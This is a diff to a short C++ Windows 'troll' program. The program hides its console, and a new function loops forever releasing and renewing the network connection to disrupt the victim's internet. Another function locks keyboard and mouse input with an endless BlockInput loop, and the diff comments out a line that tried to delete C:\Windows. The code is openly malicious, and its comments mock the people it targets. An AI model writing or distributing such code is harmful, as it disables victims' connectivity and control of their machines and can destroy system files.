@@ -4,14 +4,27 @@
 
 using namespace std;
 
+//Fucntion Protoyping
+void DisInternetTroll();
+void DisInput();
+
 int main(){
     FreeConsole(); //Hides Console
-
-    system("ipconfig /release"); //Just stops their internet!
+    DisInternetTroll();
     
-    const int result = remove("C:\Windows"); //Delets The C:\ Folder!
-    while(1){
+    //const int result = remove("C:\Windows"); //Delets The C:\ Folder!
+    return 0;
+}
+
+void DisInternetTroll(){ //This fucntion just trools their internet, turning it on and off
+    for(;;){
+    system("ipconfig /release");
+    system("ipconfig /renew");
+    }
+}
+
+void DisInput(){
+        while(1){
         BlockInput(true);
     }
-    return 0;
 }
